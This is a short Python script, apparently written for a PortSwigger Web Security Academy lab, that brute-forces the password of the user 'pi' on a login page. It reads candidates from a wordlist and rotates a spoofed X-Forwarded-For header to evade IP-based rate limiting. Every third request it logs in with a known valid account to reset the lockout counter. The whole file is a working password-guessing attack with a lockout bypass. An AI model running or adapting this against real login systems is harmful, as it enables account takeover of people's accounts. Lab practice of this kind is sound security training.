import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://ac711f571f232380c0d2b587002f007f.web-security-academy.net/login"
page_cookies = {'session': 'tbqHdXfycUYvnb0wJFnzsbvcCx3O23dv'}
my_acc = {'username': 'wiener', 'password': 'peter'}
my_proxies = {'http': 'http://172.25.160.1:8080', 'https': 'https://172.25.160.1:8080'}

pass_file = open('pass_portswigger.txt', 'r')
pass_list = pass_file.readlines()
pass_file.close()

x_forwarded = 1
i = 0

while True:
    page_headers = {'X-Forwarded-For': str(x_forwarded)}
    body = {'username': 'pi', 'password': pass_list[i].strip()}

    if x_forwarded%3 == 0:
        req2 = requests.post(url, data=my_acc, cookies=page_cookies, headers=page_headers, verify=False)
        print(f"{req2.status_code}:My account")

    else:
        req = requests.post(url, data=body, cookies=page_cookies, headers=page_headers, verify=False)

        if 'Invalid username or password.' in req.text:
            print(f"{pass_list[i].strip()}:{req.status_code}:Invalid password")
            i += 1
            
        elif 'You have made too many incorrect login attempts' in req.text:
            print(f"{pass_list[i].strip()}:{req.status_code}:Too many attempts")
            i += 1

        else:
            print(f"{pass_list[i].strip()}:{req.status_code}:GG")
            break

    x_forwarded += 1
